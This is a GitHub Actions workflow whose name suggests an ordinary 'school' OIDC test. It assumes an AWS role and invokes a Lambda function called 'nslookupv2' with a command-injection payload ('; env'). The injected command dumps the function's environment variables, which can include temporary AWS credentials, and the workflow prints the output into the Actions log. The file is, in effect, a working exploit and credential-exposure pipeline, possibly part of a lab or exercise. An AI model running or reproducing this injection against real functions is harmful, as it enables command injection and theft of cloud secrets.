name: AWS OIDC test for school standart old code procedure

on:
  push:
    branches:
      - corgi

permissions:
  id-token: write
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Invoke Vulnerable Lambda
        run: |
          # 1. Trigger the Lambda with an injected command (e.g. '; env')
          aws lambda invoke \
            --function-name nslookupv2 \
            --cli-binary-format raw-in-base64-out \
            --payload '{"domain": "; env"}' \
            response.json

          # 2. Print the response directly into the GitHub Actions log
          echo "=== LAMBDA OUTPUT ==="
          cat response.json
